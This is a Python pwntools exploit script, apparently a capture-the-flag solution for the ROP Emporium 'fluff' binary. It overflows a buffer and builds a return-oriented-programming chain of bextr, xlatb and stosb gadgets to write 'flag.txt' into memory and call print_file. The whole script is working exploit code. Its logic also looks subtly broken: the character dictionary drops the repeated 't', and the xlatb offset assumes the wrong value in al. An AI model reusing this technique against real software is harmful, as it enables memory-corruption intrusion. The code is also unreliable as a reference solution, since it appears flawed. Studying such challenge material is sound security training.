from pwn import *
elf = context.binary = ELF("./fluff")
io = process("./fluff")
#context.log_level = "debug"

data_addr = 0x00601028
pop_rdi = 0x00000000004006a3         # pop rdi ; ret

write_gadget_1 = 0x0040062a          # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
write_gadget_2 = 0x0000000000400628  # xlatb ; ret
write_gadget_3 = 0x0000000000400639  # stosb byte ptr [rdi], al ; ret


char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
            'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
            'x': 0x00400725}

def write_in_data(addrs):
    p = b""
    for i,read_addr in enumerate(addrs.values()):
        # set rbx to read_addr
        # rdx[....|LENGTH|START]  to extract higher 32 bits
        rdx = p8(32) + p8(32) + p32(0) + p16(0)
        # rcx = 0xAAAAAAAA0000000 + 0x3ef2 = 0xAAAAAAAA00003ef2
        al = 11 + i
        rcx = p32(0) + p32(read_addr - al)
        p += p64(write_gadget_1)
        p +=(rdx)
        p +=(rcx)
        # xlab does al = [rbx+al]
        p += p64(write_gadget_2)
        p += p64(pop_rdi)
        p += p64(data_addr + i)
        p += p64(write_gadget_3)

    return p

payload = b"A" * 40
payload += write_in_data(char_map)  
payload += p64(pop_rdi)
payload += p64(data_addr)           
payload += p64(elf.plt['print_file'])

io.recv()
io.sendline(payload)
io.interactive()


